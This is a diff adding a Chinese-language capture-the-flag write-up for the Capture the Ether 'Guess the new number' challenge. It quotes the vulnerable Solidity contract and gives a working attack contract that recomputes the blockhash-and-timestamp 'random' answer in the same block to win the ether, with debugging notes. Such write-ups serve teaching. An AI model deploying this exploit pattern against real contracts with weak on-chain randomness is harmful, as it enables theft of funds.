@@ -113,3 +113,96 @@
     > 因为`block.blockhash`返回值是`bytes32`，`now`返回值是`uint`
   
     
+
+### [Guess the new number](https://capturetheether.com/challenges/lotteries/guess-the-new-number/)
+
+* 题目
+
+  ```
+  pragma solidity ^0.4.21;
+  
+  contract GuessTheNewNumberChallenge {
+      function GuessTheNewNumberChallenge() public payable {
+          require(msg.value == 1 ether);
+      }
+  
+      function isComplete() public view returns (bool) {
+          return address(this).balance == 0;
+      }
+  
+      function guess(uint8 n) public payable {
+          require(msg.value == 1 ether);
+          uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
+  
+          if (n == answer) {
+              msg.sender.transfer(2 ether);
+          }
+      }
+  }
+  ```
+
+  * Write-Up
+
+    该题目的keccak256计算是跟随函数一起执行的，所以无法使用“提前算出answer，手动执行函数”的思路。但是只需要answer的计算和guess中处于同一个区块即可。
+
+    > 思路：创建另外一个合约函数，在新函数内部计算`uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now))`，再调用`guess(uint8 n)`，`answer`作为`guess(uint8 n)`的参数。
+    >
+    > 即可实现answer的计算和guess(uint8 n)在同一个区块。
+
+    攻击合约如下：
+
+  ```
+  pragma solidity ^0.4.21;
+  
+  contract GuessTheNewNumberChallenge {
+  ...
+  }
+  
+  contract exploit{
+  
+      function deposit() payable returns (uint){
+          return msg.value;
+      }
+      
+      function withdraw() payable {
+          msg.sender.transfer(this.balance);
+      }
+  
+      function attacker(address addr) {
+          require(this.balance >= 1 ether);
+  
+          uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
+  
+          GuessTheNewNumberChallenge guessContract = GuessTheNewNumberChallenge(addr);
+          guessContract.guess.value(1 ether)(answer);
+      }
+  
+      function () payable{
+  
+      }
+  }
+  ```
+
+  做的时候思路一开始就正确了，但是实现的时候总是报`transaction revert error`。
+
+  **这里有几个点需要特别注意理解：**
+
+  1. `guessContract.guess.value(1 ether)(answer);`
+
+     .value()是写在函数名和括号之间的。
+
+  2. `function () payable{}`
+
+       **非常重要！！！**
+     
+      就是因为没有写支持`payable`的`fallback`函数导致一直报`transaction revert error`。
+
+     原因是`guess(uint8)`函数中有一条`msg.sender.transfer(2 ether);`会产生带有以太的回调。如果回调函数（即fallback函数）没有`payable`关键字，那就会报错。
+     
+     ![](https://github.com/Karry-Almond/blog.io/raw/gh-pages/pic/blockchain-ctf-guessNew.png)
+     
+  3. `function attacker(address addr) {}`
+  
+       这个函数没有使用`payable`关键字，但是内部却使用了.value()。换言之，`payable`关键字的含义是“**调用该函数时**是否可以携带以太”。
+  
+       该函数调用别的函数时，只要别的函数有`payable`关键字就可以。
